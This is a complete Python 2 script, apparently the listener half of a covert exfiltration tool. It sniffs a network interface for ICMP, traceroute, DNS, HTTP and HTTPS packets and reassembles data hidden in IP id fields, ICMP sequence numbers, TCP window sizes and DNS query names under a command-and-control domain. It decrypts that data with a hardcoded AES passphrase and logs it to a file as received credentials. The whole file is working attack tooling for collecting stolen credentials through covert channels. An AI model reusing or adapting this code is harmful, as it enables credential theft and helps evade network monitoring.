#!/usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import print_function
import sys
import os
import re
import argparse
import time
import pyaes
import pyscrypt
import collections
from scapy.all import Raw, IP, ICMP, TCP, UDP, DNS, sniff

# Me
__author__ = "Emilio / @ekio_jp"
__version__ = "1.2"

# Define Config
phrase = 'Waaaaa! awesome :)'
salt = 'salgruesa'
ccname = 'evil.sub.domain'

# Setup
motd = 'carpa-logo'
DEBUG = False
ipktlen = 0
ipkttotal = 200
idic = {}
tpktlen = 0
tpkttotal = 200
tdic = {}
wpktlen = 0
wpkttotal = 200
wdic = {}
spktlen = 0
spkttotal = 200
sdic = {}
fd = ''


def decrypti(ciphertxt):
    hashed = pyscrypt.hash(phrase, salt, 1024, 1, 1, 16)
    key = hashed.encode('hex')
    aes = pyaes.AESModeOfOperationCTR(key)
    cleartxt = aes.decrypt(ciphertxt.decode('hex'))
    return cleartxt


def pkt_callback(pkt):
    global ipkttotal
    global ipktlen
    global idic
    global tpkttotal
    global tpktlen
    global tdic
    global wpkttotal
    global wpktlen
    global wdic
    global spkttotal
    global spktlen
    global sdic

    # Process PING packets
    if pkt.haslayer(ICMP) and pkt[ICMP].type == 8:
        if pkt[IP].id >= 200 and pkt[IP].id < 300:
            ipktlen = pkt[IP].id - 200
        elif pkt[IP].id >= 300 and pkt[IP].id < 400:
            ipkttotal = pkt[IP].id - 300
        elif pkt[IP].id >= 500 and pkt[IP].id < 600:
            idic[pkt[IP].id - 500] = '{:04x}'.format(pkt[ICMP].seq)

        if len(idic) == ipkttotal:
            odic = collections.OrderedDict(sorted(idic.items()))
            final = ''
            for k, v in odic.iteritems():
                final = final + v
            text = decrypti(final[:ipktlen])
            text = text.strip()
            if DEBUG:
                print('Receive Credentails via ICMP:')
                print(time.strftime("%Y-%m-%d %H:%M:%S ",
                      time.gmtime()) + text)
            find = re.compile('\\b' + text + '\\b')
            with open(fd, 'a+') as sfile:
                with open(fd, 'r') as xfile:
                    m = find.findall(xfile.read())
                    if not m:
                        sfile.write(time.strftime("%Y-%m-%d %H:%M:%S ",
                                    time.gmtime()) + text + '\n')
            idic = {}
            ipkttotal = 200

    # Process Traceroute packets
    elif pkt.haslayer(UDP) and pkt[UDP].dport >= 33434:
        if pkt[IP].id >= 200 and pkt[IP].id < 300:
            tpktlen = pkt[IP].id - 200
        elif pkt[IP].id >= 300 and pkt[IP].id < 400:
            tpkttotal = pkt[IP].id - 300
        elif pkt[IP].id >= 500 and pkt[IP].id < 600:
            tdic[pkt[IP].id - 500] = pkt[Raw].load[28:]

        if len(tdic) == tpkttotal:
            odic = collections.OrderedDict(sorted(tdic.items()))
            final = ''
            for k, v in odic.iteritems():
                final = final + v
            text = decrypti(final[:tpktlen])
            text = text.strip()
            if DEBUG:
                print('Receive Credentails via Traceroute:')
                print(time.strftime("%Y-%m-%d %H:%M:%S ",
                      time.gmtime()) + text)
            find = re.compile('\\b' + text + '\\b')
            with open(fd, 'a+') as sfile:
                with open(fd, 'r') as xfile:
                    m = find.findall(xfile.read())
                    if not m:
                        sfile.write(time.strftime("%Y-%m-%d %H:%M:%S ",
                                    time.gmtime()) + text + '\n')
            tdic = {}
            tpkttotal = 200

    # Proccess DNS packets
    elif pkt.haslayer(DNS) and ccname in pkt[DNS].qd.qname:
        text = decrypti(pkt[DNS].qd.qname.split('.')[0])
        text = text.strip()
        if DEBUG:
            print('Receive Credentails via DNS:')
            print(time.strftime("%Y-%m-%d %H:%M:%S ",
                  time.gmtime()) + text)
        find = re.compile('\\b' + text + '\\b')
        with open(fd, 'a+') as sfile:
            with open(fd, 'r') as xfile:
                m = find.findall(xfile.read())
                if not m:
                    sfile.write(time.strftime("%Y-%m-%d %H:%M:%S ",
                                time.gmtime()) + text + '\n')

    # Proccess HTTP packets
    elif pkt.haslayer(TCP) and pkt[TCP].dport == 80:
        if pkt[IP].id >= 200 and pkt[IP].id < 300:
            wpktlen = pkt[IP].id - 200
        elif pkt[IP].id >= 300 and pkt[IP].id < 400:
            wpkttotal = pkt[IP].id - 300
        elif pkt[IP].id >= 500 and pkt[IP].id < 600:
            wdic[pkt[IP].id - 500] = '{:04x}'.format(pkt[TCP].window)

        if len(wdic) == wpkttotal:
            odic = collections.OrderedDict(sorted(wdic.items()))
            final = ''
            for k, v in odic.iteritems():
                final = final + v
            text = decrypti(final[:wpktlen])
            text = text.strip()
            if DEBUG:
                print('Receive Credentails via HTTP:')
                print(time.strftime("%Y-%m-%d %H:%M:%S ",
                      time.gmtime()) + text)
            find = re.compile('\\b' + text + '\\b')
            with open(fd, 'a+') as sfile:
                with open(fd, 'r') as xfile:
                    m = find.findall(xfile.read())
                    if not m:
                        sfile.write(time.strftime("%Y-%m-%d %H:%M:%S ",
                                    time.gmtime()) + text + '\n')
            wdic = {}
            wpkttotal = 200

    # Proccess HTTPS packets
    elif pkt.haslayer(TCP) and pkt[TCP].dport == 443:
        if pkt[IP].id >= 200 and pkt[IP].id < 300:
            spktlen = pkt[IP].id - 200
        elif pkt[IP].id >= 300 and pkt[IP].id < 400:
            spkttotal = pkt[IP].id - 300
        elif pkt[IP].id >= 500 and pkt[IP].id < 600:
            sdic[pkt[IP].id - 500] = '{:04x}'.format(pkt[TCP].window)

        if len(sdic) == spkttotal:
            odic = collections.OrderedDict(sorted(sdic.items()))
            final = ''
            for k, v in odic.iteritems():
                final = final + v
            text = decrypti(final[:spktlen])
            text = text.strip()
            if DEBUG:
                print('Receive Credentails via HTTPS:')
                print(time.strftime("%Y-%m-%d %H:%M:%S ",
                      time.gmtime()) + text)
            find = re.compile('\\b' + text + '\\b')
            with open(fd, 'a+') as sfile:
                with open(fd, 'r') as xfile:
                    m = find.findall(xfile.read())
                    if not m:
                        sfile.write(time.strftime("%Y-%m-%d %H:%M:%S ",
                                    time.gmtime()) + text + '\n')
            sdic = {}
            spkttotal = 200


def parsingopt():
    parser = argparse.ArgumentParser()
    parser.add_argument('-v', '--verbose',
                        action='store_true', help='Enable Debugging')
    parser.add_argument('-i', required=True,
                        metavar='<eth0>', dest='nic', help='Sniff Interface')
    parser.add_argument('-f', required=True,
                        metavar='<file>', dest='fd', help='Output File')
    if len(sys.argv) > 1:
        try:
            return parser.parse_args()
        except IOError, msg:
            parser.error(str(msg))
    else:
        with open(motd, 'r') as sfile:
            print(sfile.read())
        print('Author: ' + __author__)
        print('Version: ' + __version__ + '\n')
        parser.print_help()
        sys.exit(1)


def main():
    global fd
    global DEBUG
    opciones = parsingopt()
    if opciones.verbose:
        DEBUG = True
    if opciones.fd:
        fd = opciones.fd

    if DEBUG:
        print('Listening.....')
    sniff(iface=opciones.nic, prn=pkt_callback, store=0,
          filter="(icmp) or (udp port 53) or "
          "(udp portrange 33434-33500) or (tcp port 80) or (tcp port 443)")


# Call main
if __name__ == '__main__':
    main()
